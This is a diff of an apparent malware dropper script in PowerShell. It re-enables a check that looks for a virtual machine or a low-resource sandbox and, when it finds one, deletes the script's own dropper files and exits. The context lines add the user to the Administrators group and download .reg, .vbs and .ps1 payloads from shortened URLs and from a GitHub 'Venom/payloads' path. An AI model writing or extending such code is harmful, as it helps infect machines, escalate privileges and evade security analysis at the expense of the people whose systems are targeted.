@@ -14,17 +14,16 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     Add-LocalGroupMember -Member $username -Group "Administrators"
 }
 
-# ### === PHASE 1: ENVIRONMENT SANITY CHECKS ===
-# if ((Get-WmiObject Win32_ComputerSystem).Model -match "Virtual|VMware|Hyper-V" -or 
-#     (Get-WmiObject Win32_Processor).NumberOfCores -lt 2 -or 
-#     (Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB -lt 4) {
-#     
-        # Remove-Item -Path "$initial_dir\BVrAihDwJNvc.ps1"
-        # Remove-Item -Path "$initial_dir\IVbaANzwiphH.cmd"
-        # Remove-Item -Path "$initial_dir\initial.cmd"
-        # Remove-Item -Path "$initial_dir\nEQlCzTBpDrO.bat"
-        # exit
-# }
+if ((Get-CimInstance Win32_ComputerSystem).Model -match "Virtual|VMware|Hyper-V" -or 
+    (Get-CimInstance Win32_Processor).NumberOfCores -lt 2 -or 
+    [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB) -lt 4) {
+
+    Remove-Item -Path "$initial_dir\BVrAihDwJNvc.ps1" -Force
+    Remove-Item -Path "$initial_dir\IVbaANzwiphH.cmd" -Force
+    Remove-Item -Path "$initial_dir\initial.cmd" -Force
+    Remove-Item -Path "$initial_dir\nEQlCzTBpDrO.bat" -Force
+    exit
+}
 
 Set-Variable -Name wd -Value (random_text)
 Set-Variable -Value ("$env:temp\$wd") -Name path
@@ -68,7 +67,6 @@ cd $path
 
 Invoke-WebRequest -UseBasicParsing -OutFile "QyjAaZDBbNPk.reg" -Uri "http://tiny.cc/k5cg001"
 Invoke-WebRequest -UseBasicParsing -OutFile "FoRAUwtxKkSB.vbs" -Uri "http://tiny.cc/s5cg001"
-# Invoke-WebRequest -UseBasicParsing -OutFile "w.bat" -Uri "http://tiny.cc/d6cg001"
 Invoke-WebRequest -UseBasicParsing -OutFile "ZDaFvwjOosKx.vbs" -Uri "http://tiny.cc/y5cg001"
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/payloads/tasks.ps1" -UseBasicParsing -OutFile "AEQKCPrkuifY.ps1"
 
